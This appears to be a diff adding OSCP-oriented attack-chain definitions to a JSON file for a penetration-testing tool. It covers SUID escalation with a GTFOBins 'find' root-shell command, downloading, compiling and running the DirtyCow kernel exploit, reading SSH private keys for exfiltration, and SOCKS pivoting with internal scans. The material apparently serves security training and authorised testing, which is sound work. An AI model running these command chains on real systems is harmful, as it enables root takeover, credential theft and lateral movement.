+          "failure_indicators": ["permission denied"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "suid-filter-interesting",
+          "name": "Identify Interesting SUID Binaries",
+          "description": "Filter for non-standard SUID binaries (not passwd, sudo, etc.)",
+          "command_template": "find / -perm -u=s -type f 2>/dev/null | grep -v -E '(passwd|sudo|ping|mount|umount)'",
+          "success_indicators": ["find", "vim", "nmap", "base64"],
+          "failure_indicators": ["no matches"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "suid-gtfobins-check",
+          "name": "Check GTFOBins for SUID Exploit",
+          "description": "Lookup found binary on GTFOBins for SUID exploitation",
+          "command_template": "echo 'Manual: Visit https://gtfobins.github.io/gtfobins/<binary>/#suid'",
+          "success_indicators": ["SUID", "shell"],
+          "failure_indicators": ["not found"],
+          "estimated_time_minutes": 2,
+          "manual": true,
+          "manual_alternative": "Search GTFOBins website for the binary name"
+        },
+        {
+          "id": "suid-exploit",
+          "name": "Exploit SUID Binary",
+          "description": "Execute GTFOBins technique to escalate privileges",
+          "command_template": "/usr/bin/find . -exec /bin/bash -p \\; -quit",
+          "success_indicators": ["root@", "#", "euid=0"],
+          "failure_indicators": ["permission denied", "error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "suid-verify",
+          "name": "Verify Root Privileges",
+          "description": "Confirm effective UID is 0 (root)",
+          "command_template": "whoami && id",
+          "success_indicators": ["root", "uid=0(root)", "euid=0(root)"],
+          "failure_indicators": ["user", "uid=1000"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "kernel-exploit-privesc",
+      "name": "Privilege Escalation via Kernel Exploit",
+      "description": "Exploit kernel vulnerability (DirtyCow, Dirty Pipe, etc.) for root",
+      "trigger_finding_types": ["kernel", "privilege_escalation", "cve"],
+      "required_phase": "POST_EXPLOITATION",
+      "oscp_relevance": 0.75,
+      "source": "OSCP methodology + exploit-db",
+      "estimated_total_time_minutes": 25,
+      "steps": [
+        {
+          "id": "kernel-enum",
+          "name": "Enumerate Kernel Version",
+          "description": "Identify kernel version and distribution",
+          "command_template": "uname -a && cat /etc/issue",
+          "success_indicators": ["Linux", "Ubuntu", "Debian"],
+          "failure_indicators": ["permission denied"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "kernel-search-exploit",
+          "name": "Search for Kernel Exploit",
+          "description": "Use searchsploit to find matching kernel exploits",
+          "command_template": "searchsploit linux kernel $(uname -r | cut -d'-' -f1)",
+          "success_indicators": ["Privilege Escalation", "Local", "EDB-ID"],
+          "failure_indicators": ["no results"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "kernel-download-exploit",
+          "name": "Download and Transfer Exploit",
+          "description": "Download exploit to Kali and transfer to target",
+          "command_template": "searchsploit -m 40839 && python3 -m http.server 8000",
+          "success_indicators": ["Exploit: Copied", "Serving HTTP"],
+          "failure_indicators": ["not found", "error"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "kernel-compile-exploit",
+          "name": "Compile Exploit on Target",
+          "description": "Compile C exploit code on target system",
+          "command_template": "gcc -o exploit exploit.c && chmod +x exploit",
+          "success_indicators": ["exploit", "executable"],
+          "failure_indicators": ["error", "gcc: not found"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "kernel-execute",
+          "name": "Execute Kernel Exploit",
+          "description": "Run compiled exploit to gain root shell",
+          "command_template": "./exploit",
+          "success_indicators": ["root@", "#", "uid=0", "got root"],
+          "failure_indicators": ["exploit failed", "error"],
+          "estimated_time_minutes": 10,
+          "manual": false
+        }
+      ]
+    },
+    {
+      "id": "ssh-pivoting-lateral",
+      "name": "Lateral Movement via SSH Pivoting",
+      "description": "Use compromised host to pivot and access internal network via SSH",
+      "trigger_finding_types": ["ssh_key", "credential", "network"],
+      "required_phase": "POST_EXPLOITATION",
+      "oscp_relevance": 0.80,
+      "source": "OSCP post-exploitation methodology",
+      "estimated_total_time_minutes": 20,
+      "steps": [
+        {
+          "id": "pivot-enum-network",
+          "name": "Enumerate Internal Network",
+          "description": "Discover internal network subnets and live hosts",
+          "command_template": "ip a && ip route && arp -a",
+          "success_indicators": ["192.168.", "10.", "172.16."],
+          "failure_indicators": ["no interfaces"],
+          "estimated_time_minutes": 3,
+          "manual": false
+        },
+        {
+          "id": "pivot-find-ssh-keys",
+          "name": "Find SSH Private Keys",
+          "description": "Search for SSH private keys in user directories",
+          "command_template": "find /home -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null",
+          "success_indicators": ["id_rsa", "id_ecdsa", ".ssh/"],
+          "failure_indicators": ["no such file"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "pivot-copy-key",
+          "name": "Exfiltrate SSH Key",
+          "description": "Copy SSH private key to attacker machine",
+          "command_template": "cat /home/user/.ssh/id_rsa",
+          "success_indicators": ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"],
+          "failure_indicators": ["permission denied"],
+          "estimated_time_minutes": 2,
+          "manual": false
+        },
+        {
+          "id": "pivot-setup-tunnel",
+          "name": "Setup SSH Tunnel",
+          "description": "Create dynamic SOCKS proxy via SSH",
+          "command_template": "ssh -i id_rsa -D 1080 -N -f user@<TARGET>",
+          "success_indicators": ["established", "tunnel"],
+          "failure_indicators": ["connection refused", "permission denied"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        },
+        {
+          "id": "pivot-scan-internal",
+          "name": "Scan Internal Network via Tunnel",
+          "description": "Use proxychains to scan internal network through pivot",
+          "command_template": "proxychains nmap -sT -Pn 192.168.100.0/24",
+          "success_indicators": ["open", "filtered"],
+          "failure_indicators": ["connection refused"],
+          "estimated_time_minutes": 5,
+          "manual": false
+        }
+      ]
+    }
+  ]
+}
